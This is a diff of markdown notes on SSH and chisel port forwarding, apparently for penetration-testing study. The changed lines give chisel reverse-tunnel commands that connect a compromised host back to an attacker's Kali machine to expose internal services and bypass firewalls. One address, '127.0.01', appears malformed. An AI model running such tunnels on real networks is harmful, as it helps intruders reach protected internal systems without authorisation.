@@ -52,7 +52,7 @@ Local port forwarding allows you to forward a port on the local machine to a rem
 - Bypass firewall blocks on remote ports to access restricted services.
 - Transfer files to a non-directly accessible server, overcoming remote file transfer blocks.
 
-Access remote HTTPS website on port 443.
+Access remote HTTPS website that's on port 443.
 
 ```bash
 ssh -N -L localhost:localPort:destinationServer:remotePort user@SSHserver
@@ -110,8 +110,8 @@ Remote port forwarding allows you to forward a port on the remote server to a lo
 - Provide remote access to a local file server, overcoming local network file access restrictions.
 
 ```bash
-chisel server --reverse --port 51234
-/tmp/chisel kali_ip:51234 R:8001:127.0.0.1:8001 R:8443:127.0.01:8443
+chisel server --reverse --port 5000
+/tmp/chisel client kali_ip:5000 R:8001:127.0.0.1:8001 R:8443:127.0.01:8443
 curl localhost:8443 # On attacker machine
 ```
 
